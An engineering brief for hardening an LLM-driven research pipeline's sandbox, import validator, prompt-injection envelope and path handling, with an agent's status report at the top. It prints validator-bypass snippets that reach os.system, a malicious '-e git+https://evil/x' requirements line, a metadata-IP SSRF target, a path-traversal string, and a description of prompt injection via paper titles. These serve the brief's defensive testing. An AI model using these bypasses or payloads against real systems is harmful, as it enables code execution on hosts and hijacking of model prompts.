# Berb Hardening Plan v2 — Implementation Brief

**Created:** 2026-08-13
**Audience:** implementing agent (Claude Sonnet 5)
**Sources:** [`implementation_audit_report.md`](../implementation_audit_report.md) · [`tasks/arch_hardening_plan.md`](arch_hardening_plan.md) · [`tasks/arch_audit_2026-08-10.md`](arch_audit_2026-08-10.md)
**Baseline state:** Wave 0 of `arch_hardening_plan.md` is shipped and green (3956 tests pass, exit 0). Waves 1–4 are untouched. Five defects were found by probing the shipped Wave 0 code; they are Wave S below.

---

## Wave S status — done

- **S-1** done — two-phase alias collection (`_collect_aliases`) closes the forward-reference bypass; `visit_Attribute` now also flags a dangerous dotted name used as a value (dict/variable indirection), guarded against double-reporting direct calls via `_reported_call_func_ids`; `getattr`/`setattr`/`delattr` added to `DANGEROUS_BUILTINS`. Empirically re-probed all 5 original bypasses (all now blocked) plus a legitimate-code false-positive check (clean).
- **S-2** done — `SandboxConfig.import_policy` (default `"allowlist"`) + reused the previously-dead `SandboxConfig.allowed_imports` field as the extra-allowed set. Enforced inside `_SecurityVisitor` itself (not a bolt-on to `validate_imports()`), so it flows through the existing `check_code_security` boundary automatically. `validate_security()`'s own default stays `"denylist"` (conservative for other callers); `check_code_security()`'s own default is `"allowlist"` (the actual security boundary). Full-suite run confirmed zero regressions from the new default (3975 passed, up from 3956 — matches new tests added).
- **S-3** done — `validate_requirements()` (allowlist grammar: plain `name[extra]<specifier>` only, rejects VCS/URL/editable/index-url lines) plus shared `_scan_project_inputs()` in `sandbox.py`, called from both `ExperimentSandbox.run_project` and `DockerSandbox.run_project`. Empirically verified against 11 legitimate and malicious requirements.txt lines.
- **S-4** done — `format_untrusted_record()` added to `sanitize.py`; rewrote the 3 fs_processor.py prompt sites where `title` sat outside `wrap_untrusted()` while `abstract` sat inside it. Audited `_literature.py`/`pdf_ingestor.py` for the same pattern — both clean (single-field or pre-combined-blob wraps, no adjacent unwrapped sibling).
- **S-5** done — `safe_path_component()` added (digest suffix when sanitization is lossy, verbatim passthrough when already-clean or when falling back to the caller's pre-disambiguated fallback string). `_safe_paper_id` now uses it instead of `sanitize_figure_id` directly.
- **S-6** done, narrower than originally scoped — `SandboxResult.rejected_reason` added and set at all 4 rejection sites (`ExperimentSandbox`/`DockerSandbox` × `run`/`run_project`, via `_scan_project_inputs`). `_execute_experiment_run` (`_execution.py`) now branches on it into a distinct `run_status = "rejected"` before the returncode ladder. **Not done:** actually skipping stage 13's refine loop on rejection — traced far enough to find that `_execute_iterative_refine` runs unconditionally on real metrics/thresholds (not gated by a status flag), except in simulated mode. Wiring a real skip would mean editing ~400 lines of refine-loop control flow I hadn't fully read, under the same time pressure that produced the bugs this plan exists to fix — scoped out rather than risking a speculative change to unfamiliar code. **Follow-up needed:** trace `_execute_iterative_refine`'s entry conditions properly and decide where a `rejected` status should short-circuit it.
- **S-7** done — deleted the stale fail-open comment in `docker_sandbox.py` (replaced with an accurate description of the current fail-closed behavior); fixed `factory.py`'s docstring (`default: True` → the actual `False`); promoted `_safe_subprocess_env` → `safe_subprocess_env` (public) in `sandbox.py` since it now serves two modules, updated `code_agent.py`'s import/call site.
- **S-8** done — wrote all 4 previously-missing Wave-0 acceptance tests: S0-2 (`TestSecurityRejectionStatus`, doubles as this wave's own rejected-status test), S0-5/S-5 (`test_traversal_attempt_stays_inside_workspace`), S0-6 (new `tests/test_full_text_ssrf.py` — direct block + the actual redirect-to-metadata-IP bypass), S0-8 (`TestCliAgentEnvStripping`).

Regression: every item tested individually as it shipped, then confirmed with a full unpartitioned suite run — 3994 passed, exit 0 (up from the 3956 baseline, matching the ~38 new tests added across S-1..S-8).

---

## How to use this document

Each item is self-contained: **Problem** (with reproduced evidence), **Approach** (with the paradigm/pattern and *why that one*), **Files**, **Acceptance test**. Implement waves in order. Do not batch a security fix into the same commit as a refactor.

**Before editing any file, read it.** Line numbers here were accurate on 2026-08-13 against the working tree but will drift as you edit; locate by symbol name, not by line.

**Rules that apply to every item:**
- Reuse before writing. Six fixes below are wiring existing, already-tested code. If you are about to write a helper, grep for it first.
- Every non-trivial change ships with one runnable test that fails if the change is reverted. No new test frameworks or fixtures.
- Mark deliberate ceilings with a `# ponytail:` comment naming the limit and the upgrade path.
- Run `pytest tests/ -q -m "not slow and not e2e and not llm"` before each commit. Baseline is 3956 passing.
- Type annotations on all new signatures; `@dataclass(frozen=True)` for new data carriers; PEP 8 / black / ruff.

---

## Paradigm & pattern selection per module

The governing principle is unchanged from v1: **reuse what exists before writing anything new**, and put policy at the choke point rather than at each caller. What is new in v2 is the recognition that *three of the five defects exist precisely because a fix was applied per-call-site instead of at a boundary* (the unwrapped `title`, the unscanned `requirements.txt`, the `Call.func`-only validator check). Each fix below therefore moves the enforcement point up, not sideways.

| Module | Paradigm | Pattern | Why this one |
|---|---|---|---|
| `experiment/validator.py` (imports) | Declarative policy, allowlist over denylist | **Strategy object selected by config** (`import_policy: allowlist \| denylist`) | S0-3's denylist is empirically porous (three live bypasses below). An allowlist is the only structurally sound answer, but flipping it unconditionally would break legitimate runs on day one — a config-selected policy with an `extra_allowed_imports` escape hatch lets it default safe and be relaxed per-deployment without a code change. |
| `experiment/validator.py` (calls) | Two-phase AST analysis | **Collect-then-check visitor**, and *dangerous names treated as values, not just call targets* | The current single-pass visitor resolves aliases only after it has walked past them (forward-reference bypass), and only inspects `Call.func` (so `d = {'x': os.system}` is invisible). Both are the same root cause: analysis scoped too narrowly. One two-phase pass fixes an entire class of indirection instead of enumerating the three variants found. |
| `experiment/sandbox.py` (the guard) | Imperative policy at a choke point | **Guard at the shared boundary** (unchanged from v1) — *extended to non-`.py` inputs* | The guard was correct; its input set was too small. `requirements.txt` is executable input (pip runs arbitrary `setup.py`), so it belongs behind the same guard, not behind a second one. |
| `experiment/sandbox.py` (rejection signal) | Data-oriented | **Typed sentinel field on the existing result type** | Raising would change a return contract every caller depends on and would be caught by broad `except` handlers upstream. Adding `rejected_reason: str \| None` to the frozen `SandboxResult` makes the security case *distinguishable* without breaking the shape. Parse-at-boundary, same as `StageResult`. |
| `literature/fs_processor.py` (prompts) | Functional, one pure helper | **Single serialization boundary** (`format_untrusted_record`) | Per-field wrapping is what let `title` slip through while `abstract` was wrapped, in the same f-string. If the whole external record is serialized by one function, no field can be forgotten — the failure mode is designed out rather than re-audited. |
| `utils/sanitize.py` (ids) | Functional, pure | **Sanitize + disambiguating digest suffix** | Sanitizing is a lossy many-to-one map; without a suffix it silently overwrites files. Appending a short hash of the *raw* input restores injectivity while keeping names readable. |
| `review/ensemble.py` | Structured concurrency | `asyncio.to_thread` + bounded `Semaphore` | The correct pattern already exists in this same file on the batch path. Copy it. |
| `llm/` client selection | Factory | **Abstract Factory (already written — just call it)** | `create_llm_client()` handles every branch already. The bug is one bypassing call site. |
| `pipeline/stage_impls/` | Module-per-stage | **Existing one-file-per-phase convention** | Not a new architecture; `_review_publish.py` violates the convention its siblings follow. |
| Inter-stage artifacts | Data-oriented | **Frozen dataclass + `from_json` classmethod, validated at the read site** | Matches the repo's existing `StageResult`/`StageContract` idiom. Validate on read because the read site is where a bad shape currently degrades silently. |
| Observability | Structured events | **Wire the orphaned `pipeline/tracing.py`** | 220 lines of working span code with zero importers. Writing a second one would be absurd. |

---

# Wave S — Defects in shipped Wave 0 code (blocking)

These are live in `main`'s working tree. All five were found by probing the shipped code, not by reading the plan.

### S-1 · Close the validator's remaining call-resolution bypasses — **CRITICAL**

**Problem.** Three bypasses reach `os.system` on the host. Reproduced against the shipped `validate_security()`:

```python
ALLOWED  "import os\ngetattr(os,'sys'+'tem')('id')"        # getattr not in DANGEROUS_BUILTINS
ALLOWED  "def f():\n    _o.system('id')\nimport os as _o\nf()"  # alias table filled in source order
ALLOWED  "import os\nd={'x':os.system}\nd['x']('id')"      # _resolve_call_name returns "" for non-Name/Attribute
BLOCKED  "import os\nos.popen('id')"                       # these do work
BLOCKED  "import importlib as _i\n_i.import_module('os').system('id')"
```

Root cause is one thing, not three: **the visitor analyses too narrow a slice** — a single source-order pass, inspecting only `Call.func`.

**Approach — collect-then-check, and treat dangerous names as values.**

1. Split `_SecurityVisitor` into two phases. Phase 1 walks the whole tree collecting `_import_aliases` / `_from_aliases` only. Phase 2 walks again performing checks. This makes alias resolution order-independent and kills the forward-reference bypass. Keep both phases in the same class with a `collect_only: bool`, or use two small visitor classes — either is fine; do not introduce a framework.
2. Extend `visit_Attribute` so that a *load* of a dangerous dotted name (`os.system` appearing anywhere, not just as a call target) is an error. This single change covers dict-indirection, list-indirection, variable aliasing (`f = os.system`), and callback registration in one rule. Reuse `_canonical_call_name`'s resolution logic — extract it to work on any `ast.expr`.
3. Add `getattr`, `setattr`, `delattr` to `DANGEROUS_BUILTINS`. String-computed attribute access cannot be resolved statically, so the call itself must be refused.

**Ceiling.** `# ponytail: static AST analysis — a determined attacker with string construction still wins; the container (S0-4) is the real boundary.`

**Files.** `berb/experiment/validator.py`

**Acceptance test.** Extend the existing parametrized `test_validate_security_rejects_bypass_patterns` in `tests/test_berb_validator.py` with all five snippets above (the three ALLOWED ones must flip to blocked; the two BLOCKED ones must stay blocked). Extend `test_validate_security_still_allows_legitimate_code` to prove no false positive on ordinary numpy/pathlib/sklearn code — this is the guard against over-blocking.

---

### S-2 · Complete S0-3's dropped allowlist inversion — **HIGH**

**Problem.** `arch_hardening_plan.md`'s S0-3 specified "invert to allowlist: reject imports not in `SAFE_STDLIB`". This was not implemented and the omission is not disclosed in the plan's own status write-up. `visit_Import` / `visit_ImportFrom` still gate only on the `BANNED_MODULES` denylist, and `validate_imports()` emits `severity="warning"`, `category="import"` — never blocking. Any dangerous stdlib module not explicitly enumerated is importable today.

**Approach — config-selected policy strategy.**

Add to `ExperimentConfig` (or the validator's config section, wherever it sits naturally — do not create a new config file):

```python
import_policy: str = "allowlist"          # "allowlist" | "denylist"
extra_allowed_imports: tuple[str, ...] = ()
```

Under `allowlist`, an import whose top-level module is not in `SAFE_STDLIB | COMMON_SCIENCE | extra_allowed_imports` is a `category="security"`, `severity="error"` issue. Under `denylist`, preserve today's behaviour exactly, for operators who need to unblock a run without a code change.

Default to `allowlist`. Expect this to surface legitimate imports the science set is missing — that is the point, and `extra_allowed_imports` is the pressure valve. Document both keys in `configs/config.berb.example.yaml`.

**Files.** `berb/experiment/validator.py`, `berb/config.py`, `configs/config.berb.example.yaml`

**Acceptance test.** Allowlist mode rejects `import ctypes`-class unknowns and accepts `numpy`/`pathlib`; `extra_allowed_imports=("mypkg",)` makes `import mypkg` pass; denylist mode reproduces current behaviour. Also amend `tasks/arch_hardening_plan.md`'s S0-3 status line to disclose that this was deferred to here — the plan's self-report is currently inaccurate.

---

### S-3 · `requirements.txt` bypasses the security guard entirely — **HIGH**

**Problem.** `check_code_security` scans `project_dir.rglob("*.py")`. But `docker_sandbox.py` Phase 0 runs `pip install -r requirements.txt` **with the network up**, and `_write_requirements_txt` (`docker_sandbox.py:589-596`) explicitly respects an LLM-generated `requirements.txt`, appending to it rather than replacing it. pip executes arbitrary `setup.py` from any sdist and honours `-e git+https://…`, `--index-url`, `--find-links`. So the LLM fully controls a code-execution channel that the S0-1 guard never inspects. S0-1's stated premise — no code reaches a subprocess unvalidated — does not hold on the Docker path.

**Approach — same boundary, wider input set. Allowlist grammar.**

Add to `berb/experiment/validator.py`:

```python
def validate_requirements(text: str) -> CodeValidation: ...
```

Accept only plain requirement specifiers: `name`, `name[extra]`, with an optional PEP 440 version specifier and optional trailing comment. Reject, as `category="security"`, `severity="error"`: any line containing `git+`, `hg+`, `svn+`, `bzr+`, a URL scheme (`http:`, `https:`, `file:`), or beginning with `-e`, `--editable`, `-r`, `--requirement`, `-f`, `--find-links`, `-i`, `--index-url`, `--extra-index-url`, `--trusted-host`, `--pre`. Blank lines and `#` comments pass.

Call it from `check_code_security`'s siblings at the same choke point: in both `ExperimentSandbox.run_project` and `DockerSandbox.run_project`, alongside the existing `*.py` scan, check `project_dir / "requirements.txt"` if present. Prefer extending the existing loop to a `_scan_project_inputs(project_dir)` helper in `sandbox.py` so both backends share one implementation and a future third input type has an obvious home.

**Ceiling.** `# ponytail: name+version allowlist only — a malicious package published under an innocuous name on PyPI still installs; pinning/hash-checking is the upgrade path.`

**Files.** `berb/experiment/validator.py`, `berb/experiment/sandbox.py`, `berb/experiment/docker_sandbox.py`

**Acceptance test.** `run_project` on a project whose `requirements.txt` contains `-e git+https://evil/x` returns rejected and never spawns a subprocess (assert via `mock_run.assert_not_called()`, matching the existing pattern in `tests/test_sandbox_security_gate.py`); a normal `numpy==1.26.4` project still runs.

---

### S-4 · Prompt-injection envelope has an unwrapped field beside a wrapped one — **HIGH**

**Problem.** [`fs_processor.py:492-502`](../berb/literature/fs_processor.py):

```
Title: {title}                                              ← raw external data, unwrapped
Abstract: {wrap_untrusted(str(abstract), "paper abstract")} ← wrapped
```

`title` is the same provenance as `abstract` (attacker-controlled on arXiv), unbounded in length, and sits *above* the envelope where injected instructions are strongest. The same shape recurs in the claims-extraction and methods prompts in this file. S0-5 wrapped one field per prompt and missed its neighbour.

**Approach — move the boundary: serialize the whole record through one function.**

Add to `berb/utils/sanitize.py`, beside `wrap_untrusted`:

```python
def format_untrusted_record(fields: Mapping[str, str], label: str) -> str:
    """Render an entire externally-sourced record inside one envelope.

    Prefer this over per-field wrap_untrusted() in prompts: wrapping field
    by field is how `title` ended up outside the envelope while `abstract`
    was inside it, in the same f-string.
    """
```

Implement it in terms of `wrap_untrusted` (one envelope, `key: value` lines inside), so there is one delimiter implementation, not two. Then rewrite each affected prompt in `fs_processor.py` to pass `{"Title": title, "Abstract": abstract}` as a single record. Audit the remaining S0-5 sites (`_literature.py`, `pdf_ingestor.py`) for the same adjacent-field pattern while you are there.

**Files.** `berb/utils/sanitize.py`, `berb/literature/fs_processor.py`, and any adjacent-field site found in `berb/literature/_literature.py` / `pdf_ingestor.py`

**Acceptance test.** `format_untrusted_record({"Title": "…", "Abstract": "…"}, "paper")` places **both** values between the delimiters; a forged delimiter in *either* field is neutralized. This is also the S0-5 test that was never written (see S-8).

---

### S-5 · Sanitized paper IDs collide and silently overwrite — **MEDIUM**

**Problem.** `sanitize_figure_id` is many-to-one:

```python
sanitize_figure_id('10.1234/abc') == sanitize_figure_id('10.1234_abc')   # True → '10.1234_abc'
```

`_safe_paper_id` feeds this straight into `paper_file.write_text(...)`, so two distinct papers land on one filename and the second silently destroys the first. S0-7 correctly closed the traversal hole and opened a data-integrity one.

**Approach — restore injectivity with a digest suffix.**

In `berb/utils/sanitize.py`, add a sibling (do **not** change `sanitize_figure_id`; figure IDs have different callers and a stable-name requirement):

```python
def safe_path_component(raw: str, *, fallback: str = "item") -> str:
    """Sanitize `raw` for filesystem use, appending a short digest of the
    ORIGINAL value when sanitization was lossy, so two distinct inputs can
    never collide onto one filename.
    """
```

Return `sanitize_figure_id(raw)` unchanged when it is already equal to `raw` (keeps clean IDs readable), otherwise `f"{cleaned}_{hashlib.sha1(raw.encode()).hexdigest()[:8]}"`. Point `_safe_paper_id` at it.

**Files.** `berb/utils/sanitize.py`, `berb/literature/fs_processor.py`

**Acceptance test.** `'10.1234/abc'` and `'10.1234_abc'` produce different components; both stay inside the workspace; `'../../../etc/passwd'` does not escape; an already-clean id like `'arXiv2401'` is returned verbatim.

---

### S-6 · A security rejection is indistinguishable from a crashed experiment — **MEDIUM**

**Problem.** The guard returns `SandboxResult(returncode=-1, stderr=<security message>)`. [`_execution.py:214`](../berb/pipeline/stage_impls/_execution.py) branches solely on `result.returncode == 0`, so a rejection falls into the ordinary failure path: `run_status = "failed"`, identical to a segfault or a syntax error. The security stderr is then eligible to be fed back into the stage-13 refine loop, so the pipeline can burn retries re-generating code against a wall it is never told about. (The retry-burn half is `HYPOTHESIS` — the failure-path branch is verified, the refine-loop consumption was not traced end to end. Confirm before relying on it.)

**Approach — typed sentinel on the existing frozen result, not an exception.**

Add `rejected_reason: str | None = None` to `SandboxResult`. Set it wherever `check_code_security` / `validate_requirements` rejects. In `_execution.py`, branch on it *before* the returncode ladder:

```python
if result.rejected_reason:
    run_status = "rejected"
    # do not enter the refine loop — regenerating cannot fix a policy refusal
```

Surface it distinctly in the stage result and log it at `error` level. Raising instead was considered and rejected: it changes a contract every caller depends on and risks being swallowed by an upstream broad `except`.

**Files.** `berb/experiment/sandbox.py` (the dataclass + both set sites), `berb/experiment/docker_sandbox.py`, `berb/pipeline/stage_impls/_execution.py`

**Acceptance test.** A rejected run yields `run_status == "rejected"`, not `"failed"`, and the refine loop is not entered. Existing `test_sandbox_security_gate.py` assertions on `returncode == -1` must keep passing — this is additive.

---

### S-7 · Stale comments that describe pre-fix behaviour — **MEDIUM / LOW**

Three docs now contradict the code. A maintainer reading only these would draw the wrong conclusion about the system's security posture.

| File | Says | Reality |
|---|---|---|
| `berb/experiment/docker_sandbox.py:509-511` | iptables "will gracefully degrade… network remains available but the code has already been validated" | `entrypoint.sh` now `exit 1`s on that exact failure. `arch_hardening_plan.md` S0-4 explicitly instructed deleting this comment. **Delete it.** |
| `berb/experiment/factory.py:24-25` | "Controlled by `config.docker.fallback_to_sandbox` (default: True)" | Default is now `False` (S0-4). Update the docstring. |
| `berb/experiment/code_agent.py:29` | imports `_safe_subprocess_env` (module-private) across a module boundary | Promote to a public name in `sandbox.py` — it now serves two modules — and update both call sites. |

**Files.** as listed. **Acceptance test.** None needed (comment/rename only); the existing suite is the regression proof for the rename.

---

### S-8 · Write the four Wave-0 tests that were never written — **MEDIUM**

Wave 0 shipped four items whose own plan entries specified an acceptance test that does not exist. The full suite passes, which proves absence of breakage, not presence of coverage — reverting any of these four fixes today breaks nothing in CI.

| Item | Test to add | File |
|---|---|---|
| S0-2 | code with a `category="security"` issue → stage returns `FAILED`, not `COMPLETED` | `tests/test_berb_executor.py` |
| S0-5 | forged delimiter inside untrusted payload is neutralized | covered by S-4's test |
| S0-6 | fetch of `169.254.169.254`, **and** of a URL redirecting there, are both refused | new `tests/test_full_text_ssrf.py` |
| S0-7 | `paper_id="../../../etc/x"` writes inside the workspace | covered by S-5's test |
| S0-8 | a secret-suffixed env var set in the parent is absent from the CLI-agent child env | `tests/test_sandbox_security_gate.py` |

---

# Wave 1 — Critical architecture (unchanged from v1, still unimplemented)

Both items are verified-open in the current tree. Small diffs, high leverage.

### A1-1 · Un-block the async review fan-out
`berb/review/ensemble.py` — `_generate_review` is `async def` but calls `self._llm_client.chat(...)` synchronously, landing in `urllib.request.urlopen`. The `asyncio.gather` over N personas therefore yields **zero** parallelism and blocks the event loop throughout. Wrap in `await asyncio.to_thread(...)`; add a bounded `asyncio.Semaphore` around the fan-out so restored concurrency doesn't immediately trip provider rate limits. The correct pattern already exists in this same file on the batch-API path — copy it.
**Test:** two fake reviewers each sleeping 100 ms complete in <150 ms wall-clock, not >200 ms.

### A1-2 · Stop bypassing the LLM client factory
`berb/pipeline/executor.py` — the non-ACP branch constructs `LLMClient.from_rc_config()` directly, so configured `fallback_providers` and cascade routing **never engage** on the default path. Call `create_llm_client(config)` unconditionally; it already branches on ACP internally.
**Preserve:** the existing `if candidate.config.base_url and candidate.config.api_key` guard — stage impls rely on `llm=None` when nothing is configured. Dropping it hands every stage a misconfigured non-`None` client.
**Test:** config with `fallback_providers` → executor produces a `MultiProviderLLMClient`; config with no key → still `None`.

---

# Wave 2 — High-severity architecture

### A2-1 · Split `_review_publish.py` (3617 lines, six `@register_stage` in one file)
Mechanical move into the one-file-per-concern shape its siblings already use — `_review.py` (E18–E20), `_archive.py` (E21), `_export.py` (E22), `_citations.py` (E23). See `arch_hardening_plan.md` §A2-1 for the verified line-range seams.
**No logic changes in the same commit** — the existing 196 tests in `test_berb_executor.py` are the regression proof. Registry decorators mean no dispatch table to update, but the new modules must be imported so registration fires.
Same treatment for `berb/llm/openrouter_adapter.py` (3951 lines), separate commit.

### A2-2 · Delete the dead port layer
`berb/adapters.py` — `LiteratureSource`, `ExperimentSandbox`, `ArtifactStore` each have exactly one implementer (their own `Recording*` stub) and zero read sites in `stage_impls/`. Tests inject via the `llm=` kwarg, which already works. Delete all three. `LLMProvider` has one real consumer — either convert it to the kwarg convention and delete it too, or keep it and document it as the *only* supported seam. **Do not leave both mechanisms half-wired**; that ambiguity is the actual defect. `AdapterBundle`'s `message`/`memory` members stay — they have real call sites.

### A2-3 · Resolve the layer-leak contradiction
Every `stage_impls/*.py` imports `LLMClient` directly while `adapters.py` documents "Stage implementations depend on this, not LLMClient". Once A2-2 picks a seam, rewrite that docstring to describe what the code actually does. A comment asserting a contract the code violates is worse than no comment.

---

# Wave 3 — Structural

### A3-1 · Typed contracts for cross-stage artifacts
12 artifacts are read by more than one stage; `_review_publish.py` picks among `stage-14*/experiment_summary.json` candidates by an ad-hoc `_richness` heuristic and `summary.py` silently degrades to `None` on shape mismatch. Add a frozen dataclass with a `from_json` classmethod per artifact, raising on shape mismatch **at the read site**. Start with the three hottest — `experiment_summary.json`, `evidence_registry.json`, `claim_manifest.json` — before generalizing. **Do not attempt all 57 artifact types.**
Expect previously-"passing" runs to start failing honestly; that is the point.

### A3-2 · Delete confirmed dead code
`berb/llm/model_router.py` and `model_cascade.py` — two parallel, unused cascade implementations, zero importers. Wire one into the factory (Wave 1 makes this reachable) or delete both. Two unused copies is strictly worse than one.

### A3-3 · Decide the orphaned subsystems — **owner decision, not a refactor**
`berb/memory/`, `berb/research/`, `berb/vision/`, `mnemo_bridge/`, `reasoner_bridge/`, `berb/metrics/` — fully implemented, tested, zero production importers (~3400 lines in `research/` + `vision/` alone). Wire or delete, but **ask first**. Wave 4 resolves two of these by use.

---

# Wave 4 — Observability & testability

### A4-1 · Structured logging with run correlation
278 `logging.getLogger(__name__)` sites, all printf-style free text, **no run_id on any record** — logs from concurrently-executing DAG-level stages are unattributable. Lazy fix: one `logging.LoggerAdapter` (or `Filter`) installed once at runner entry, injecting `run_id` + `stage`. **No call-site changes.**

### A4-2 · Wire the orphaned tracing
`berb/pipeline/tracing.py` — 220 lines of complete span/trace code writing `<run_dir>/<trace_id>/trace.jsonl`, zero importers. Call `new_trace` in `runner.py`, `start_span` around `execute_stage`. Reuse, not rewrite.

### A4-3 · Fix cost attribution
`CostEvent` has `stage`/`phase`/`node_id`/`purpose` fields and `by_stage()`/`by_phase()`/`by_node()` aggregators exist — but the call site in `client.py` passes **none of them**, so every aggregator returns `{}`. It also swallows failures. Thread stage/phase through to the call site, persist to `run_dir/cost_report.json` at run end, and add a cost section to `berb report` (which today contains zero occurrences of "cost").

### A4-4 · Restore type checking
`pyproject.toml` has `[[tool.mypy.overrides]] module = ["berb.*"] → ignore_errors = true`; only 8 modules are actually checked, so CI's `mypy berb/` is near-vacuous. Remove the blanket override **incrementally**, security-critical modules first: `experiment/validator.py`, `experiment/factory.py`, `experiment/sandbox.py`, `llm/client.py`, `pipeline/executor.py`. Add each to the checked list as it goes clean.

### A4-5 · Coverage gate + flip the security scan blocking
Raise `--cov-fail-under` from 55 → 70 once Waves S–3 land (each ships tests), then 80 per the project standard. **Ratchet only — never lower it to make a build pass.**
Separately: the `security` CI job added by S0-10 is `continue-on-error: true` pending triage of 40 pre-existing bandit findings. Triage them, fix or `# nosec`-with-justification each, then drop `continue-on-error`.

---

## Execution order & risk

| Wave | Blocking? | Risk | Regression proof |
|---|---|---|---|
| **S-1…S-6** | **Yes — first** | S-2's allowlist will reject legitimate imports until `extra_allowed_imports` is tuned; S-3 will reject LLM-written requirements using VCS installs. Both are intended and both have documented escape hatches. | New per-fix tests + full suite (baseline 3956) |
| **S-7, S-8** | Yes | None — comments, a rename, and tests | Full suite |
| **1** (A1-1, A1-2) | Yes | A1-2 must preserve the `base_url and api_key` guard or every stage receives a misconfigured client | Full suite |
| **2** (A2-1…A2-3) | No | Mechanical moves; highest churn, lowest logical risk | 196 tests in `test_berb_executor.py` |
| **3** (A3-1…A3-3) | No | A3-1 converts silent degradation into loud failure — expect new failures that were always broken | Per-artifact round-trip tests |
| **4** (A4-1…A4-5) | No | A4-4/A4-5 surface pre-existing type and coverage debt | CI |

**Sequencing rules.**
- Wave S ships as its own PR series, **not bundled with refactors**. Mixing a security fix into a 3617-line file split makes the security change unreviewable.
- Do not start Wave 2's file splits before Wave S is complete — moving 3617 lines while validator bypasses are open trades review attention for cosmetics.
- S-1 and S-2 both edit `validator.py`; do S-1 first (it restructures the visitor) so S-2 layers onto the two-phase form rather than the single-pass one.

---

## Open questions for the owner — do not decide these unilaterally

1. **A3-3** — wire or delete the orphaned subsystems? ~3400 lines of tested, unreachable code in `research/` + `vision/` alone. Product decision.
2. **S0-8 carry-over** — should the `--dangerously-skip-permissions` CLI-agent path exist at all? It is off by default but is the single highest-privilege code path in the repo. Still hardcoded as an argv element; the plan's original "surface as an explicit opt-in flag with a startup warning" was never done.
3. **S-2 default** — confirm `import_policy: allowlist` as the shipped default. It is the secure choice and it *will* break runs whose legitimate imports fall outside `SAFE_STDLIB | COMMON_SCIENCE` until tuned.
4. **`zotero_integration.py:611`** — a third `httpx.AsyncClient` uses a config-supplied `mcp_url` (the S0-6 write-up counted only two client sites). Operator-trusted input, same trust class as `setup_commands`, so no fix is proposed — confirm that trust boundary is intended.
